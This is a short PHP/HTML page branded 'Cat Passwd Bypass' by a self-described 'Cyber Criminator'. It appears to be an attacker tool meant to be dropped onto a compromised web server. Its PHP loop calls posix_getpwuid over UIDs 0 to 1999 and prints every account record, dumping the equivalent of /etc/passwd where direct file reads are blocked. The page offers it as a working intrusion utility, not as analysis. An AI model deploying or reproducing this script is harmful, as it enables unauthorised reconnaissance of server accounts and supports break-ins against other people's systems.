<html>
     <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="icon" href="https://i.hizliresim.com/7corox1.png">
     <META NAME="robots" CONTENT="noindex,nofollow">
     <link href="https://fonts.googleapis.com/css?family=Righteous&display=swap" rel="stylesheet">
 <style type="text/css">
@font-face {
	font-family: 'Righteous', cursive;
}
body { background-image: url("https://i.hizliresim.com/b8yogra.gif"); }
		background-color: #000;
}
    color: white;  }
	  
</style><br><br><center>
<img src="https://i.hizliresim.com/7corox1.png" width="80" height="60">
<font color="white" size="6"  face="Righteous">Cat Passwd Bypass By ramil feyziyev (Cyber Criminator)</font>
<img src="https://i.hizliresim.com/7corox1.png" width="80" height="60"></center><br><br>
<font color="white" size="4"  face="Righteous">
<?php 
for($uid=0;$uid<2000;$uid++){ // cat /etc/passwd 
$nothing = posix_getpwuid($uid); 
if (!empty($nothing)) { 
while (list ($key, $val) = each($nothing)){ 
print "$val:"; 
} 
print "<br />"; 
} 
} 
?></font>
